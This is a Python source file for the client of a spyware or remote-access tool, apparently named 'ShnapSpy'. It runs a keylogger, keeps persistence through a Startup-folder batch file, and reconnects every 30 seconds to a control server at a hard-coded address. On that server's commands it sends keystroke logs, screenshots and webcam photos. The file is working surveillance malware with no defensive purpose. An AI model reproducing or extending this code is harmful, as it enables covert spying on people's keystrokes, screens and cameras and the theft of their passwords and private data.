import socket
import os
import shutil
from PIL import ImageGrab
import cv2
from time import sleep
import time
import json
import keylogger
import sys
import getpass

IP = "10.0.0.5"
PORT = 1279

# path = os.path.dirname(sys.executable)
path = os.path.dirname(__file__)
print("path=", path)
DATA = os.path.join(path, "data.json")
print("data path=", DATA)
LOGGER = os.path.join(path, "logger.txt")
print("logger path=", LOGGER)
IMAGE = os.path.join(path, "screen.jpg")
WEBCAM = os.path.join(path, "opencv.png")

USER_NAME = getpass.getuser()
BAT = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ShnapSpy.bat' % USER_NAME
print(BAT)
# CONTENT = {"key": '000000000000000000000000000000000', "related": 1}
listeners = keylogger.start(LOGGER)

run = True
offline_mode = False
print(DATA)


def client_process():
    """
    Runs the client process with the server
    CLient process consists of waiting for the server to send requests
    :return:
    """
    global run
    while run:
        # from now on waits for a notification from the server to run a preocces and send the info of it
        print("Inside the loop")
        command = client.recv(3).decode()
        print("test")

        print(command)
        try:
            if command == "log":
                print("send logs")
                send_info(logs=True)

            elif command == "img":
                ImageGrab.grab().save(IMAGE, "JPEG")
                print("send logs")
                send_info(image=True)

            elif command == "web":
                camera_port = 0
                camera = cv2.VideoCapture(camera_port)
                time.sleep(0.1)  # If you don't wait, the image will be dark
                return_value, image = camera.read()
                cv2.imwrite(WEBCAM, image)
                del (camera)  # so that others can use the camera
                print("send web")
                send_info(web=True)

            elif command == "end":
                # end()
                run = False

        except:
            client.send(b"ERROR")


def end():
    """
    ends client process and deletes related files
    :return:
    """
    for i in listeners:
        i.stop()
    print("finished listeners:", path)
    os.remove(DATA)
    try:
        os.remove(BAT)
    except:
        print("didnt find bat")
        pass

    try:
        os.remove(LOGGER)
    except:
        print("didnt find logger")
        pass
    try:
        os.remove(WEBCAM)
    except:
        print("didnt find web")
        pass
    try:
        print("didnt find image")
        os.remove(IMAGE)
    except:
        pass
    print("ended all")


def send_info(logs=False, image=False, web=False):
    """

    :param logs: Boolean - starts log process
    :param image: Boolean - starts image process
    :param web: Boolean - starts web process
    :return:
    """
    client.send(b"start")
    # handles sending info like images and text logs to the server
    # receives the answer if the procces can start
    answer = client.recv(4).decode()
    print("recv = " + answer)
    # checks if the answer is the correct one: True
    if answer == "True":
        # in case of logs, sending the text logs
        if logs:
            with open(LOGGER, 'rb') as r:
                log = r.read()
                client.send(str(len(log)).encode() + b"-")
                print(str(len(log)))
                client.send(log)
                with open(LOGGER, 'w') as r:
                    r.close()
            print("sent logs")
        # in case of images, sending the image
        elif image:
            with open(IMAGE, 'rb') as r:
                log = r.read()
                client.send(str(len(log)).encode() + b"-")
                print(str(len(log)))
                client.send(log)
                print(log)
            print("sent image")
        # in case of web images, sending web image
        elif web:
            with open(WEBCAM, 'rb') as r:
                log = r.read()
                client.send(str(len(log)).encode() + b"-")
                print(str(len(log)))
                client.send(log)
                print(log)
            print("sent web")

    else:
        print("ERROR ERROR ERROR - DIDNT GET TRUE AS ANSWER")
    return


def start_process():
    """
    Starts the client process with the server.
    Start process consists of sending identification key/ initialization if client is new
    :return: ends the start of the process
    """
    # sending identification and relation
    with open(DATA, "r") as r:
        content = json.load(r)
        # first sends key for identification
        client.send(content['key'].encode())
        if content['key'] == "0" * 33:
            # gets the new key
            content['key'] = client.recv(33).decode()

            # Create relation to pass on the socket
            relation = ("0" * (6 - len(str(content['related'])))) + str(content['related'])
            print("relation = ", relation)
            # todo sends relation (under work)
            client.send(relation.encode())
            with open(DATA, 'w') as f:
                json.dump(content, f)
    print("ended start")


try:
    if not os.path.isfile(DATA):
        # checks if data file exists, if not- terminate
        quit("DATA FILE HAS BEEN DELETED")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(5)
    # creating connection

    try:
        # try to establish connection
        client.connect((IP, 1279))
        start_process()

    except:
        # couldn't connect to the server, switching to offline mode
        run = False
        offline_mode = True

    if run:
        # process of online mode

        try:
            client_process()
        except:
            # connection lost mid process
            print('Online mode crashed')

            run = False
            offline_mode = True

    if offline_mode:
        # process of offline mode
        while offline_mode:
            # in offline mode, the code tries to connect to the server every minute
            try:
                sleep(30)
                client.connect((IP, 1279))
                offline_mode = False
                run = True
                start_process()
                client_process()

            except OSError as e:
                print('reconnecting')
                if e.winerror == 10056:
                    # refresh socket in case there is a need
                    # 10056 - A connect request was made on an already connected socket
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                elif e.winerror == 10061 or e.winerror == 10054:
                    # in case of connection error
                    #  10061 - refused  |   10054 - connection error
                    print('connection error')

                    offline_mode = True
                    run = False
                    pass


except Exception as e:
    # in case it reaches an error that wasn't predicted
    print(e)
    pass
print("end")
